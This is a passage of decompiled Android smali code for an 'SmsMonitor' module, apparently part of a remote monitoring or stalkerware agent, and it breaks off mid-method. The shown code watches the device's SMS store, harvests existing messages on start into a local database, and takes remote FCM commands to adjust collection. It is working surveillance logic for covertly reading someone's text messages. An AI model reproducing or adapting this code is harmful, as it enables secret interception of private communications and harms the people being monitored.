.class public Lcom/hp/vd/module/monitor/SmsMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "SmsMonitor.java"


# static fields
.field public static final ATTRIBUTE_GATHER_SMS_ON_START:Ljava/lang/String; = "gather_sms_on_start"

.field public static final ATTRIBUTE_MAX_SMS_ID:Ljava/lang/String; = "max_sms_id"

.field public static final COMMAND_ARGUMENT_NEW_MAX_SMS_ID:Ljava/lang/String; = "new_max_sms_id"

.field public static final COMMAND_SET_MAX_SMS_ID:Ljava/lang/String; = "sms_set_max_sms_id"

.field protected static final TAG:Ljava/lang/String; = "SmsMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/SmsData;",
            ">;"
        }
    .end annotation
.end field

.field protected commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

.field protected initialSmsListerThread:Ljava/lang/Thread;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/SmsData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 43
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 53
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 55
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    .line 56
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 57
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 59
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    .line 60
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->initialSmsListerThread:Ljava/lang/Thread;

    .line 62
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    const/4 v0, 0x0

    .line 64
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 71
    const-class v0, Lcom/hp/vd/data/SmsData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 77
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 79
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 80
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 81
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 82
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x6

    .line 83
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v6.0"

    .line 84
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 86
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_sms_id"

    const-string v2, "0"

    .line 87
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "gather_sms_on_start"

    const-string v2, "true"

    .line 88
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x5

    .line 90
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 91
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 93
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "SmsMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 6

    .line 210
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 216
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 223
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "SmsMonitor"

    .line 225
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): maxSmsId set to "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_sms_id"

    .line 227
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    .line 225
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const-string v1, "SmsMonitor"

    .line 231
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "initialize(): gatherSmsOnStart = "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "gather_sms_on_start"

    .line 233
    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 231
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "SmsMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 238
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 246
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 249
    :goto_0
    new-instance v1, Lcom/hp/vd/module/monitor/sms/SmsObserver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v1, v2, v3, v4, v0}, Lcom/hp/vd/module/monitor/sms/SmsObserver;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    .line 254
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 263
    new-instance v2, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    const-string v2, "SmsMonitor"

    const-string v3, "Could not create the Dao"

    .line 257
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 258
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 105
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "SmsMonitor"

    const-string v2, "install() called."

    .line 106
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/16 v0, 0xfa

    .line 112
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/SmsMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 118
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 380
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->monitoringStatus:Z

    return v0
.end method

.method public persistModuleData(Lcom/hp/vd/data/ModuleData;)Z
    .locals 0

    .line 395
    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/SmsMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result p1

    return p1
.end method

.method public start()Z
    .locals 9

    .line 277
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 279
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "SmsMonitor"

    const-string v2, "This module is currently DEactivated."

    .line 280
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 289
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    if-nez v1, :cond_1

    .line 291
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    invoke-direct {v1, p0, v2, v3}, Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;-><init>(Lcom/hp/vd/module/monitor/SmsMonitor;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    .line 292
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    const-string v2, "com.hp.vb.FCM_COMMAND_RECEIVED"

    .line 294
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 296
    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 297
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "SmsMonitor"

    const-string v3, "fcm: commandReceiver was registered in smsmon"

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 300
    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "SmsMonitor"

    const-string v4, "fcm: Exception caught while registering receiver"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 304
    :cond_1
    :goto_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "gather_sms_on_start"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    const/4 v7, 0x1

    if-ne v1, v7, :cond_2

    const-string v1, "SmsMonitor"

    const-string v2, "start(): sms lister is about to be started."

    .line 305
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 307
    new-instance v8, Lcom/hp/vd/module/monitor/sms/SmsLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    move-object v1, v8

    move-object v6, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/sms/SmsLister;-><init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/sms/SmsObserver;Lcom/hp/vd/agent/log/IWriter;)V

    .line 315
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Sms-Lister-Thread"

    invoke-direct {v1, v8, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->initialSmsListerThread:Ljava/lang/Thread;

    .line 316
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->initialSmsListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    const-string v1, "SmsMonitor"

    const-string v2, "start(): sms lister was started."

    .line 318
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 321
    :cond_2
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-ne v1, v7, :cond_4

    .line 322
    :cond_3
    new-instance v1, Ljava/lang/Thread;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v3, "Sms-Writer-Queue"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    .line 323
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 326
    :cond_4
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://sms/"

    .line 327
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    invoke-virtual {v1, v2, v7, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v1, "SmsMonitor"

    const-string v2, "start(): smsObserver was registered."

    .line 329
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 331
    iput-boolean v7, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->monitoringStatus:Z

    return v7
.end method

.method public stop()Z
    .locals 4

    .line 339
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "SmsMonitor"

    .line 340
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "stop(): called [version="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "]."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 346
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    if-eqz v0, :cond_0

    .line 348
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    .line 349
    iput-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/sms/FcmCommandReceiver;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 352
    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "SmsMonitor"

    const-string v3, "fcm: Exception caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 360
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    if-eqz v0, :cond_1

    .line 361
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    .line 364
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 365
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 368
    :cond_2
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->initialSmsListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_3

    .line 369
    iget-object v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->initialSmsListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_3
    const/4 v0, 0x0

    .line 372
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/SmsMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 6

    .line 129
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "SmsMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 132
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 148
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez p1, :cond_2

    if-eqz v0, :cond_1

    const-string p1, "SmsMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 164
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_1
    return v2

    :cond_2
    const-string v1, "max_sms_id"

    .line 174
    invoke-virtual {p1, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "gather_sms_on_start"

    .line 175
    invoke-virtual {p1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 181
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "system"

    .line 183
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/SmsMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 181
    invoke-virtual {v3, v4, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 186
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    if-eqz v1, :cond_3

    const-string v3, "sms_max_sms_id"

    .line 189
    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_3

    const-string v3, "SmsMonitor"

    .line 192
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

